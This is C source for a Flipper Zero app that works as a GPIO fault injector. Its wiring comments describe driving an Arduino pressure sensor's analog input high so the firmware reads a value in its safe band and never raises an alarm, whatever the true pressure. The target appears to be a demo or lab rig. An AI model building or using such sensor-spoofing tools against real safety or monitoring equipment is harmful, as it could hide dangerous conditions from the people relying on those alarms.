// Aegis Edge — Flipper-side GPIO fault injector.
//
// Wiring (shared ground is mandatory):
//
//   Flipper PA7 (ext. header pin 2) ──[ 1 kΩ ]── Arduino A0  (pressure)
//   Flipper GND (ext. header pin 11) ──────────── Arduino GND
//
// Behaviour:
//   IDLE   — PA7 in analog/high-Z, target sensor reads normally.
//   ATTACK — PA7 driven push-pull HIGH (3.3 V). PA7's ~50 Ω output overpowers
//            the sensor wiper, pinning A0 inside the firmware's safe band so
//            the target never alarms regardless of true input.
//
// The 1 kΩ series resistor protects the STM32 from any 5 V back-feed if A0
// is ever misconfigured as an output.

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_gpio.h>
#include <furi_hal_resources.h>
#include <gui/gui.h>
#include <input/input.h>

#define ATTACK_PIN (&gpio_ext_pa7) // Flipper external pin 2 → 1 kΩ → Arduino A0

typedef struct {
    bool attacking;
    uint32_t since_tick;
    FuriMutex* mutex;
} AppState;

typedef struct {
    FuriMessageQueue* queue;
} AppCtx;

static void draw_centered_str(Canvas* canvas, int y, const char* str) {
    uint16_t w = canvas_string_width(canvas, str);
    canvas_draw_str(canvas, (128 - (int)w) / 2, y, str);
}

static void draw_callback(Canvas* canvas, void* ctx) {
    AppState* s = ctx;
    furi_mutex_acquire(s->mutex, FuriWaitForever);

    canvas_clear(canvas);

    uint32_t tick = furi_get_tick();
    bool fast_blink = (tick / 250) & 1;

    /* --- decorative top bar --- */
    canvas_draw_box(canvas, 0, 0, 128, 13);
    canvas_set_color(canvas, ColorWhite);

    canvas_set_font(canvas, FontPrimary);
    const char* title = "FAULT INJECTOR";
    uint16_t tw = canvas_string_width(canvas, title);
    int tx = (128 - (int)tw) / 2;
    canvas_draw_str(canvas, tx, 10, title);

    /* vertical stripes flanking the title */
    for(int x = 3; x < tx - 4; x += 3) {
        canvas_draw_line(canvas, x, 3, x, 9);
    }
    for(int x = tx + tw + 4; x < 119; x += 3) {
        canvas_draw_line(canvas, x, 3, x, 9);
    }

    /* small blinking READY indicator (idle only) */
    if(!s->attacking && fast_blink) {
        canvas_draw_box(canvas, 121, 4, 4, 4);
    }

    canvas_set_color(canvas, ColorBlack);

    /* --- big status block --- */
    canvas_set_font(canvas, FontPrimary);
    if(s->attacking) {
        if(fast_blink) {
            canvas_draw_box(canvas, 6, 22, 116, 24);
            canvas_set_color(canvas, ColorWhite);
            draw_centered_str(canvas, 38, "!! ATTACKING !!");
            canvas_set_color(canvas, ColorBlack);
        } else {
            canvas_draw_frame(canvas, 6, 22, 116, 24);
            draw_centered_str(canvas, 38, "!! ATTACKING !!");
        }
    } else {
        canvas_draw_frame(canvas, 6, 22, 116, 24);
        draw_centered_str(canvas, 38, "-- IDLE --");
    }

    /* --- subline: target wire --- */
    canvas_set_font(canvas, FontSecondary);
    draw_centered_str(canvas, 58, "TARGET: PA7 -> A0");

    furi_mutex_release(s->mutex);
}

static void input_callback(InputEvent* event, void* ctx) {
    AppCtx* c = ctx;
    furi_message_queue_put(c->queue, event, FuriWaitForever);
}

static void set_pin_safe(void) {
    furi_hal_gpio_write(ATTACK_PIN, false);
    furi_hal_gpio_init(ATTACK_PIN, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
}

static void apply_mode(AppState* s) {
    if(s->attacking) {
        furi_hal_gpio_init(ATTACK_PIN, GpioModeOutputPushPull, GpioPullNo, GpioSpeedLow);
        furi_hal_gpio_write(ATTACK_PIN, true);
    } else {
        set_pin_safe();
    }
}

int32_t aegis_attacker_app(void* p) {
    UNUSED(p);

    AppState state = {
        .attacking = false,
        .since_tick = 0,
        .mutex = furi_mutex_alloc(FuriMutexTypeNormal),
    };

    AppCtx ctx = {
        .queue = furi_message_queue_alloc(8, sizeof(InputEvent)),
    };

    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, draw_callback, &state);
    view_port_input_callback_set(view_port, input_callback, &ctx);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    apply_mode(&state);

    InputEvent event;
    bool running = true;
    uint32_t last_redraw = 0;

    while(running) {
        FuriStatus status = furi_message_queue_get(ctx.queue, &event, 100);

        if(status == FuriStatusOk && event.type == InputTypeShort) {
            furi_mutex_acquire(state.mutex, FuriWaitForever);
            switch(event.key) {
            case InputKeyOk:
                state.attacking = !state.attacking;
                state.since_tick = furi_get_tick();
                apply_mode(&state);
                break;
            case InputKeyBack:
                running = false;
                break;
            default:
                break;
            }
            furi_mutex_release(state.mutex);
            view_port_update(view_port);
        }

        /* keep the blink animation alive */
        uint32_t now = furi_get_tick();
        if(now - last_redraw >= 200) {
            last_redraw = now;
            view_port_update(view_port);
        }
    }

    set_pin_safe();

    view_port_enabled_set(view_port, false);
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_message_queue_free(ctx.queue);
    furi_record_close(RECORD_GUI);
    furi_mutex_free(state.mutex);

    return 0;
}
